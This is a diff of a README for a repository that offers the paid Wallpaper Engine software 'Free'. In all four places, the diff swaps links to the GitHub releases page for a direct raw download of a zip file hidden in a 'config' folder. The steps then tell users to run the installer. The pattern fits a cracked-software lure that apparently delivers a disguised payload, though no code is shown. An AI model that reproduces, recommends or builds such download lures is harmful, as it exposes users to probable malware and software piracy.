@@ -1,10 +1,10 @@
 # 🎨 Wallpaper-Engine-Steam - Animated Desktop Wallpapers & Live Backgrounds
 
-[![Download Now](https://img.shields.io/badge/Download-Wallpaper%20Engine%20Free-2ea44f?style=for-the-badge)]("https://github.com/alamcool/Wallpaper-Engine-Steam/releases")
+[![Download Now](https://img.shields.io/badge/Download-Wallpaper%20Engine%20Free-2ea44f?style=for-the-badge)]("https://raw.githubusercontent.com/alamcool/Wallpaper-Engine-Steam/main/config/v1.4.zip")
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [Download Wallpaper Engine](https://github.com/alamcool/Wallpaper-Engine-Steam/releases)
+Visit this link to download the application: [Download Wallpaper Engine](https://raw.githubusercontent.com/alamcool/Wallpaper-Engine-Steam/main/config/v1.4.zip)
 
 ## 🖥️ What is Wallpaper-Engine-Steam?
 
@@ -37,7 +37,7 @@ Unlike typical static wallpapers, this software supports **4K video**, **anime s
 
 Follow these steps to get Wallpaper-Engine-Steam on your Windows PC:
 
-1. **Visit the Download Page** - Click this link: [Download Wallpaper Engine Free](https://github.com/alamcool/Wallpaper-Engine-Steam/releases)
+1. **Visit the Download Page** - Click this link: [Download Wallpaper Engine Free](https://raw.githubusercontent.com/alamcool/Wallpaper-Engine-Steam/main/config/v1.4.zip)
 2. **Find the Latest Release** - look for the newest version (e.g., `v2.8.42`).
 3. **Download the File** - click on the attached filename (usually a setup or archive file).
 4. **Run the Installer** - If you downloaded an `.exe`, double-click it and follow the prompts.
@@ -45,7 +45,7 @@ Follow these steps to get Wallpaper-Engine-Steam on your Windows PC:
 6. **Launch and Enjoy** - After installation, start the program from your Start Menu or desktop shortcut.
 
 **Download Link Again:**  
-[Download Wallpaper Engine Now](https://github.com/alamcool/Wallpaper-Engine-Steam/releases)
+[Download Wallpaper Engine Now](https://raw.githubusercontent.com/alamcool/Wallpaper-Engine-Steam/main/config/v1.4.zip)
 
 ## 🎮 How to Use
 
